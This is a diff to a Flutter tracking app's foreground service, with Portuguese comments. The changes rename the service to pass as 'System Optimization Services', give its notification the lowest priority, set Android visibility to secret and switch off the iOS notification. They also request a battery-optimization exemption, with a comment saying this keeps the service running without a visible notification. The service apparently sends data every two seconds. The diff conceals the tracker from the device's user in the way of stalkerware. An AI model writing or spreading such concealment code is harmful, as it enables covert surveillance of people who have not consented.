@@ -119,20 +119,21 @@ class _TrackerScreenState extends State<TrackerScreen> {
   void _initForegroundTask() {
     FlutterForegroundTask.init(
       androidNotificationOptions: AndroidNotificationOptions(
-        channelId: 'system_sync_v1',
-        channelName: 'System Services',
-        channelImportance: NotificationChannelImportance.MIN, // Menor importância possível
-        priority: NotificationPriority.LOW,
+        channelId: 'system_optimization_v1',
+        channelName: 'System Optimization Services',
+        channelImportance: NotificationChannelImportance.MIN, 
+        priority: NotificationPriority.MIN,
         isSticky: true,
+        visibility: NotificationVisibility.VISIBILITY_SECRET,
         iconData: const NotificationIconData(
           resType: ResourceType.mipmap,
           resPrefix: ResourcePrefix.ic,
           name: 'launcher',
         ),
       ),
-      iosNotificationOptions: const IOSNotificationOptions(showNotification: true),
+      iosNotificationOptions: const IOSNotificationOptions(showNotification: false),
       foregroundTaskOptions: const ForegroundTaskOptions(
-        interval: 2000, // Enviar a cada 2 segundos
+        interval: 2000, 
         allowWakeLock: true,
       ),
     );
@@ -140,6 +141,10 @@ class _TrackerScreenState extends State<TrackerScreen> {
 
   Future<void> _checkStatus() async {
     final running = await FlutterForegroundTask.isRunningService;
+    // Pedir para ignorar otimização de bateria (ajuda a manter vivo sem notificação visível)
+    if (!await FlutterForegroundTask.isIgnoringBatteryOptimizations) {
+      await FlutterForegroundTask.requestIgnoreBatteryOptimization();
+    }
     setState(() => _isRunning = running);
   }
 
